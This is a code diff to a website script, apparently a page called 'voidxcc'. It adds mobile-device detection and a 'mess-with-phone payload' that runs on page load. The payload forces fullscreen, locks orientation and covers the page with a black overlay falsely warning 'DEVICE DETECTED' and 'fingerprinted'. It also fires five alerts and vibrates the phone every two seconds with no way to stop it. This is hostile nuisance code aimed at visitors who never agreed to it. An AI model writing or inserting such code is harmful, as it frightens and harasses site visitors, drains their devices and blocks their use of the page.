@@ -74,6 +74,50 @@
 
   console.log('%cvoidxcc loaded', 'color:#00ff9f;font-weight:bold;');
 
+  // mobile/phone detection + mess-with-phone payload
+  function isMobile() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera || '';
+    if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua)) return true;
+    if (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /Macintosh/i.test(ua)) return true; // iPad
+    if (window.innerWidth <= 768 && ('ontouchstart' in window || navigator.maxTouchPoints > 0)) return true;
+    return false;
+  }
+
+  function messWithPhone() {
+    // vibrate in a pattern
+    try { if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 400, 100, 200]); } catch (e) {}
+    // force fullscreen
+    try {
+      const el = document.documentElement;
+      const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+      if (fs) fs.call(el);
+    } catch (e) {}
+    // lock orientation if possible
+    try { if (screen.orientation && screen.orientation.lock) screen.orientation.lock('portrait'); } catch (e) {}
+    // full-screen overlay
+    const ov = document.createElement('div');
+    ov.style.cssText = 'position:fixed;inset:0;z-index:999999;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px;font-size:1.2rem;';
+    ov.innerHTML = '<div><h1 style="color:#f00;">⚠ DEVICE DETECTED ⚠</h1><p>Mobile/phone fingerprinted.</p><p>Vibration + fullscreen triggered.</p></div>';
+    document.body.appendChild(ov);
+    // spam alerts
+    let n = 0;
+    const alertLoop = setInterval(() => {
+      if (n >= 5) { clearInterval(alertLoop); return; }
+      try { alert('voidxcc: phone detected (' + (n + 1) + '/5)'); } catch (e) {}
+      n++;
+    }, 800);
+    // periodic vibration
+    setInterval(() => { try { if (navigator.vibrate) navigator.vibrate([100, 50, 100]); } catch (e) {} }, 2000);
+  }
+
+  if (isMobile()) {
+    console.log('%cphone detected — running payload', 'color:#ff00aa;font-weight:bold;');
+    // delay slightly so page loads
+    setTimeout(messWithPhone, 500);
+  } else {
+    console.log('%cdesktop — no phone payload', 'color:#00ff9f;');
+  }
+
   // wire spawn button
   const spawnBtn = document.getElementById('spawnBtn');
   if (spawnBtn) {
